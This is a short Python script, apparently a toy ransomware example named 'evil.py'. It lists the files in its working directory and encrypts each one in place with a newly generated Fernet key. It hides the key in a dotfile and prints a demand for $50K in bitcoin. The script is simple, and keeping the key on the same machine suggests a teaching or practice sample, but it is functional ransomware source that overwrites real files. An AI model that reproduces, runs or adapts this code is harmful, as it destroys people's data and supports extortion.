#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

print("retreiving files...")

for file in os.listdir():
	if file == "evil.py" or file == ".hiddenkey.key" or file == "hero.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print("generating key...")
key = Fernet.generate_key()

print("hiding key...")
with open(".hiddenkey.key", "wb") as fout:
	fout.write(key)

print("encrypting files...")

for file in files:
	with open(file, "rb") as fin:
		content = fin.read()

	encrypted_content = Fernet(key).encrypt(content) #returns bytestring

	with open(file, "wb") as fout:
		fout.write(encrypted_content)


print("files locked, send $50K in bitcoin to NoobGrinder420!!") 

